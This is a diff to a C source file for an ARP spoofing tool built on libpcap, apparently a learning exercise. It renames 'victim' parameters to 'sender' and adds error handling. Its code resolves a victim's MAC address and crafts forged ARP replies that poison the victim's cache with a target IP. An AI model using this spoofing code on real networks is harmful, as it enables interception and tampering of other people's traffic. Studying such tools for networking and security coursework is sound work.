@@ -1,19 +1,19 @@
 #include <arp.h>
 
-int receiveArpPacket(IN pcap_t *handle, IN uint8_t *ipAddress, OUT arpStructure *receivedArpPacket) {
-    int ret = EXIT_FAILURE;
+int receiveArpPacket(IN pcap_t *handle, IN uint8_t *senderIpAddress, OUT arpStructure *receivedArpPacket) {
     int waitCount = 20;
+    int ret = EXIT_FAILURE;
     arpStructure *arpPacket = NULL;
 
     // packet parsing
     while(ret && --waitCount) {
         printf("[*] Finding MAC Address...\n");
-        struct pcap_pkthdr* header;
-        const u_char* packet;
-        int res = pcap_next_ex(handle, &header, &packet);
-        if (res == 0) continue;
-        if (res == -1 || res == -2) break;
-        // end skeleton code
+        struct pcap_pkthdr *pcapHeader;
+        const u_char *packet;
+        if(pcap_next_ex(handle, &pcapHeader, &packet) < 0) {
+            fprintf(stderr, "Failed receive packet\n");
+            goto end;
+        }
 
         // parse Ethernet in Datalink Layer
         ethernetHeader *ethernetPacket = (ethernetHeader *)packet;
@@ -21,12 +21,12 @@ int receiveArpPacket(IN pcap_t *handle, IN uint8_t *ipAddress, OUT arpStructure 
         switch(ntohs(ethernetPacket->type)) {
             case ETHERNET_TYPE_ARP: // value is 0x0806
                 arpPacket = (arpStructure *)(packet + sizeof(ethernetHeader));
-                if(!memcmp(arpPacket->senderProtocolAddress, ipAddress, ARP_PROTOCOL_LENGTH_IP)) { 
+                if(!memcmp(arpPacket->senderProtocolAddress, senderIpAddress, ARP_PROTOCOL_LENGTH_IP)) { 
                     // Print Ethernet Packet
                     printf("[*] Ethernet Information\n");
                     printMacAddress("  - Dest MAC : ", ethernetPacket->destinationMac);
                     printMacAddress("  - Src  MAC : ", ethernetPacket->sourceMac);
-                    printf("  - Type     : [%04x]", ntohs(ethernetPacket->type));
+                    printf("  - Type     : [%04x]",    ntohs(ethernetPacket->type));
                     printf("\n");
 
                     // Print ARP Packet
@@ -36,6 +36,7 @@ int receiveArpPacket(IN pcap_t *handle, IN uint8_t *ipAddress, OUT arpStructure 
                     printf("\n");
                     ret = EXIT_SUCCESS;
                 }
+                arpPacket = NULL;
                 break;
             default:
                 break;
@@ -44,10 +45,11 @@ int receiveArpPacket(IN pcap_t *handle, IN uint8_t *ipAddress, OUT arpStructure 
         sleep(1);
     }
 
+end:
     return ret;
 }
 
-int getVictimMacAddress(IN pcap_t *handle, IN char *interfaceName, IN char *victimIpAddress, OUT uint8_t *victimMacAddress) {
+int getSenderMacAddress(IN pcap_t *handle, IN char *interfaceName, IN char *senderIpAddress, OUT uint8_t *senderMacAddress) {
     int ret = EXIT_FAILURE;
     struct in_addr laddr;
     mergedStructure mergedPacket;
@@ -92,7 +94,7 @@ int getVictimMacAddress(IN pcap_t *handle, IN char *interfaceName, IN char *vict
     }
 
     // set destination IP Address 
-    if(inet_aton(victimIpAddress, &laddr) < 0) {
+    if(inet_aton(senderIpAddress, &laddr) < 0) {
         fprintf(stderr, "IP Address Format Invalid!\n");
         goto end;
     }
@@ -117,7 +119,7 @@ int getVictimMacAddress(IN pcap_t *handle, IN char *interfaceName, IN char *vict
         printf("[+] Get MAC Address\n");
         memset(receivedArpPacket.senderHardwareAddress, 0x00, ARP_HARDWARE_LENGTH_ETHERNET);
         if(receiveArpPacket(handle, arpPacket.targetProtocolAddress, &receivedArpPacket) == EXIT_SUCCESS) {
-            memcpy(victimMacAddress, receivedArpPacket.senderHardwareAddress, ARP_HARDWARE_LENGTH_ETHERNET);
+            memcpy(senderMacAddress, receivedArpPacket.senderHardwareAddress, ARP_HARDWARE_LENGTH_ETHERNET);
             break;
         }
     }
@@ -128,7 +130,7 @@ end:
     return ret;
 }
 
-int spoofMacAddress(IN pcap_t *handle, IN char *interfaceName, IN char *victimIpAddress, IN char *targetIpAddress, IN uint8_t *victimMacAddress) {
+int spoofMacAddress(IN pcap_t *handle, IN char *interfaceName, IN char *senderIpAddress, IN char *targetIpAddress, IN uint8_t *senderMacAddress) {
     int ret = EXIT_FAILURE;
     struct in_addr laddr;
     uint8_t buf[sizeof(ethernetHeader) + sizeof(arpStructure)];
@@ -144,7 +146,7 @@ int spoofMacAddress(IN pcap_t *handle, IN char *interfaceName, IN char *victimIp
     }
 
     // set destination MAC Address for Ethernet
-    memcpy(ethernetPacket.destinationMac, victimMacAddress, ARP_HARDWARE_LENGTH_ETHERNET);
+    memcpy(ethernetPacket.destinationMac, senderMacAddress, ARP_HARDWARE_LENGTH_ETHERNET);
 
     // set Ethernet Type
     ethernetPacket.type = htons(ETHERNET_TYPE_ARP);
@@ -164,7 +166,7 @@ int spoofMacAddress(IN pcap_t *handle, IN char *interfaceName, IN char *victimIp
     }
 
     // set destination MAC Address
-    memcpy(arpPacket.targetHardwareAddress, victimMacAddress, ARP_HARDWARE_LENGTH_ETHERNET);
+    memcpy(arpPacket.targetHardwareAddress, senderMacAddress, ARP_HARDWARE_LENGTH_ETHERNET);
 
     // set source IP Address 
     if(inet_aton(targetIpAddress, &laddr) < 0) {
@@ -174,7 +176,7 @@ int spoofMacAddress(IN pcap_t *handle, IN char *interfaceName, IN char *victimIp
     memcpy(&arpPacket.senderProtocolAddress, &laddr.s_addr, ARP_PROTOCOL_LENGTH_IP);
 
     // set destination IP Address 
-    if(inet_aton(victimIpAddress, &laddr) < 0) {
+    if(inet_aton(senderIpAddress, &laddr) < 0) {
         fprintf(stderr, "IP Address Format Invalid!\n");
         goto end;
     }
